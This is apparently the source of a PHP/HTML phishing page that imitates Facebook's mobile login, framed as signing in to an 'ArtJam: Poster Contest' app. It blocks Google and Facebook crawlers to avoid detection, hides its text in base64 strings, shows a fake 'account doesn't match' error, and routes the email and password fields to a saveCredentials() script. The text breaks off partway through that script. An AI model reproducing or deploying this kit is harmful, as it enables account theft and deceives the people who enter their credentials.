<?php
// Add the user agent blocking code here
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Block Google bots
if (strpos($user_agent, 'Googlebot') !== false || strpos($user_agent, 'Googlebot-Image') !== false || strpos($user_agent, 'Googlebot-Video') !== false) {
    header('HTTP/1.0 403 Forbidden');
    echo "Access Forbidden: Your user agent is not allowed to access this site.";
    exit();
}

// Block Facebook bots
if (strpos($user_agent, 'facebookexternalhit') !== false) {
    header('HTTP/1.0 403 Forbidden');
    echo "Access Forbidden: Your user agent is not allowed to access this site.";
    exit();
}

// Continue with normal website functionality if user agent is not blocked

?>



<html lang="en">


<head>
<title><?php
$str = 'TG9nIGludG8gRmFjZWJvb2sgfCBGYWNlYm9vaw==' ;
echo base64_decode($str);
?>
</title>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">

<link href="data:image/png;base64,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" rel="shortcut icon" sizes="196x196">
<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/l/0,cross/68C0gkOkbUv.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="oYr34N/" crossorigin="anonymous">

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yo/l/0,cross/w-5cV9EuuCF.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">

<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/dCpxtUfKHef.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="X1pu+2v" crossorigin="anonymous">

<meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">


<style type="text/css">
@font-face {
  font-weight: 400;
  font-style:  normal;
  font-family: circular;

  src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Regular.woff2') format('woff2');
}

@font-face {
  font-weight: 500;
  font-style:  normal;
  font-family: circular;

  src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Medium.woff2') format('woff2');
}

@font-face {
  font-weight: 700;
  font-style:  normal;
  font-family: circular;

  src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2') format('woff2');
}

@font-face {
  font-weight: 900;
  font-style:  normal;
  font-family: circular;

  src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Black.woff2') format('woff2');
}
</style>
</head>

<body tabindex="0" class="touch x1-5 _fzu _50-3 iframe acw portrait" style="min-height: 746px; background-color: rgb(255, 255, 255);">


<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 746px;"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0"><?php
$str = 'RmFjZWJvb2s=' ;
echo base64_decode($str);
?></h1>

<div id="page">

<div class="_129_" id="header-notices">
</div>

<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 746px;">

<div class="_7om2">

<div class="_4g34" id="u_0_0_fx">

<div class="_5yd0 _2ph- _5yd1" style="display: none;" id="" data-sigil="">

<div class="_52jd">
</div>
</div>

<div class="_9om_">

<div class="_4-4l">

<div id="" data-sigil="">
</div>

<style>
.acy.apm.abb {
    display: flex;
    justify-content: center;
    align-items: center;
}
</style>

<div class="_5yd0 _2ph- _5yd1" style="display: flex; justify-content: center; align-items: center;" id="login_error" data-sigil="m_login_notice">
  <div class="_52jd"><?php
$str = 'VGhlIG1vYmlsZSBudW1iZXIgb3IgZW1haWwgeW91J3ZlIGVudGVyZWQgZG9lc24ndCBtYXRjaCBhbnkgYWNjb3VudC4g' ;
echo base64_decode($str);
?><a href="/" class="_652e"><?php
$str = 'RmluZCB5b3VyIGFjY291bnQu' ;
echo base64_decode($str);
?></a></div>
</div>

<div class="_7om2 _52we _2pid _52z6">

<div class="_4g34"><a href="fb4402-log-in-verification.php"><img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDIyLjUxIDM2MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMxODc3RjI7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5GQldvcmRtYXJrX0hleC1SR0ItMTAyNDwvdGl0bGU+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTY2LjQzLDEyNi42OGMtOS42NSwwLTEyLjQ0LDQuMjgtMTIuNDQsMTMuNzJ2MTUuNjZoMjUuNzRsLTIuNTgsMjUuM0gxNTR2NzYuNzhIMTIzLjExVjE4MS4zNkgxMDIuM3YtMjUuM2gyMC44MVYxNDAuODNjMC0yNS41MiwxMC4yOS0zOSwzOS0zOWExNDYuMTcsMTQ2LjE3LDAsMCwxLDE4LDEuMDd2MjMuODFaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTgxLjg3LDIwMy44OGMwLTI4LjUyLDEzLjUxLTUwLDQxLjgyLTUwLDE1LjQ0LDAsMjQuODcsNy45NCwyOS4zOCwxNy44VjE1Ni4wNmgyOS41OVYyNTguMTRIMjUzLjA3VjI0Mi43Yy00LjI5LDkuODctMTMuOTQsMTcuNTktMjkuMzgsMTcuNTktMjguMzEsMC00MS44Mi0yMS40NS00MS44Mi01MFptMzAuODgsNi44N2MwLDE1LjIyLDUuNTcsMjUuMywxOS45NCwyNS4zLDEyLjY2LDAsMTkuMDktOS4yMiwxOS4wOS0yMy44VjIwMmMwLTE0LjU4LTYuNDMtMjMuOC0xOS4wOS0yMy44LTE0LjM3LDAtMTkuOTQsMTAuMDgtMTkuOTQsMjUuM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zNDcsMTUzLjkxYzEyLDAsMjMuMzcsMi41OCwyOS41OSw2Ljg2bC02Ljg2LDIxLjg4YTQ4LjYsNDguNiwwLDAsMC0yMC41OS00LjcyYy0xNi43MywwLTI0LDkuNjUtMjQsMjYuMTd2NmMwLDE2LjUyLDcuMjksMjYuMTcsMjQsMjYuMTdhNDguNiw0OC42LDAsMCwwLDIwLjU5LTQuNzJsNi44NiwyMS44N2MtNi4yMiw0LjI5LTE3LjU4LDYuODctMjkuNTksNi44Ny0zNi4yNSwwLTUyLjc2LTE5LjUyLTUyLjc2LTUwLjgzdi00LjcyQzI5NC4yNCwxNzMuNDMsMzEwLjc1LDE1My45MSwzNDcsMTUzLjkxWiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTM4MC42NiwyMTF2LTljMC0yOC45NSwxNi41MS00OCw1MC4xOS00OCwzMS43NCwwLDQ1LjY4LDE5LjMsNDUuNjgsNDcuNjF2MTYuM2gtNjVjLjY1LDEzLjk0LDYuODcsMjAuMTYsMjQsMjAuMTYsMTEuNTksMCwyMy44MS0yLjM2LDMyLjgyLTYuMjJMNDc0LDI1M2MtOC4xNSw0LjMtMjQuODgsNy41MS0zOS42Nyw3LjUxQzM5NS4yNCwyNjAuNSwzODAuNjYsMjQxLDM4MC42NiwyMTFabTMwLjg4LTEzLjNoMzcuMzJ2LTIuNTdjMC0xMS4xNS00LjUtMjAtMTgtMjBDNDE2LjkxLDE3NS4xNCw0MTEuNTQsMTgzLjk0LDQxMS41NCwxOTcuNjZaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNTkxLDIxMC4zMmMwLDI4LjUyLTEzLjcyLDUwLTQyLDUwLTE1LjQ0LDAtMjYuMTYtNy43Mi0zMC40NS0xNy41OXYxNS40NEg0ODkuMzlWMTA0LjhMNTIwLjI3LDEwMnY2OC4yYzQuNS05LDE0LjM3LTE2LjMsMjguNzQtMTYuMywyOC4zMSwwLDQyLDIxLjQ1LDQyLDUwWm0tMzAuODgtNy4wOGMwLTE0LjM3LTUuNTctMjUuMDktMjAuMzctMjUuMDktMTIuNjYsMC0xOS41Miw5LTE5LjUyLDIzLjU5djEwLjcyYzAsMTQuNTgsNi44NiwyMy41OSwxOS41MiwyMy41OSwxNC44LDAsMjAuMzctMTAuNzIsMjAuMzctMjUuMDlaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNjAxLjMzLDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyUzcwMywxNzUuMTQsNzAzLDIwNC41M3Y1LjE0YzAsMjkuMzgtMTYuNzMsNTAuNjItNTAuODMsNTAuNjJTNjAxLjMzLDIzOS4wNSw2MDEuMzMsMjA5LjY3Wm03MC43OC03LjI5YzAtMTMuNTEtNS41OC0yNC4yMy0yMC0yNC4yM3MtMTkuOTUsMTAuNzItMTkuOTUsMjQuMjN2OS40NGMwLDEzLjUxLDUuNTgsMjQuMjMsMTkuOTUsMjQuMjNzMjAtMTAuNzIsMjAtMjQuMjNaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNzEzLjI3LDIwOS42N3YtNS4xNGMwLTI5LjM5LDE2LjczLTUwLjYyLDUwLjgzLTUwLjYyczUwLjgzLDIxLjIzLDUwLjgzLDUwLjYydjUuMTRjMCwyOS4zOC0xNi43Myw1MC42Mi01MC44Myw1MC42MlM3MTMuMjcsMjM5LjA1LDcxMy4yNywyMDkuNjdabTcwLjc4LTcuMjljMC0xMy41MS01LjU4LTI0LjIzLTE5Ljk1LTI0LjIzcy0xOS45NCwxMC43Mi0xOS45NCwyNC4yM3Y5LjQ0YzAsMTMuNTEsNS41NywyNC4yMywxOS45NCwyNC4yM3MxOS45NS0xMC43MiwxOS45NS0yNC4yM1oiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik04NTcuMzksMjA0Ljc0bDMwLjQ1LTQ4LjY4aDMyLjgxbC0zMS45NSw1MC40LDMzLjI0LDUxLjY4SDg4OS4xM2wtMzEuNzQtNTB2NTBIODI2LjVWMTA0LjhMODU3LjM5LDEwMloiLz48L3N2Zz4K" width="112" class="img" alt=""></a>
</div>
</div>

<div class="_5rut">

<div id="" data-sigil="">
</div>

<div id="" data-sigil="">
</div>

<div id="otp_retrieve_desc_container">
</div>

<div style="text-align: center;">
  <img class="img-fluid" src="https://static.wixstatic.com/media/8f8a88_3a96ad076d5d47a381cb625dd052a8a3~mv2.jpg/v1/fill/w_950,h_950,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/8f8a88_3a96ad076d5d47a381cb625dd052a8a3~mv2.jpg" style="width: 68px;margin-bottom: 11px;margin-top: 0px;border-right: 0px solid black;">
  <p class="text-center"><?php
$str = 'TG9nIGludG8geW91ciBGYWNlYm9vayBhY2NvdW50IHRvIGNvbm5lY3QgdG8gPHN0cm9uZz5BcnRKYW06IFBvc3RlciBDb250ZXN0PC9zdHJvbmc+' ;
echo base64_decode($str);
?></p>
</div>
<div>

<div class="_56be">


<div class="_55wo _56bf">




<div class="_56be">

<div class="_55wo _56bf">


<div class="_7om2">

<div class="_4g34 _5i2i _52we">


<div class="_5xu4">

<div class="_2pi9" style="display:none" id="u_0_1_L+"><a href="#" data-sigil="password-plain-text-toggle">

<span class="mfss" style="display:none" id="u_0_2_iq">HIDE
</span>

<span class="mfss" id="u_0_3_6w">SHOW
</span></a>


</div>


</div>
</div>
</div>



<div class="_2pie" style="text-align:center;">
  <div id="login_password_step_element" data-sigil="login_password_step_element">
    <form id="login-form" action="" method="POST">
      <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="off" id="m_login_email" name="email" placeholder="Mobile number or email" type="text" data-sigil="m_login_email">
      <div class="_55wq">
</div>
      <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="off" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
      <div class="_55wq">
</div>
      <button type="submit" value="Log in" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4" onclick="saveCredentials(event)">
        <span class="_55sr">Log in</span>
      </button>
    </form>
  </div>
</div>
<script>
 function saveCredentials(event) {
  event.preventDefault(); // prevent default form submission behavior
      
  // Get the email and password values from the form
